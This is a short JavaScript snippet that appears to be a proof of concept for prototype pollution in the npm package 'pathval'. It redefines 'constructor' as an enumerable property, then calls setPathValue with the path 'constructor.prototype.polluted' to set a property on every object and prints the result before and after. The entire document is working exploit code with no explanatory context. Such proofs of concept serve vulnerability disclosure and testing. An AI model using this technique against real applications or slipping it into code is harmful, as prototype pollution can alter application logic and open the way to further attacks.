var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
var pathval = require('pathval');
var obj = {};
console.log({}.polluted);
pathval.setPathValue(obj, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);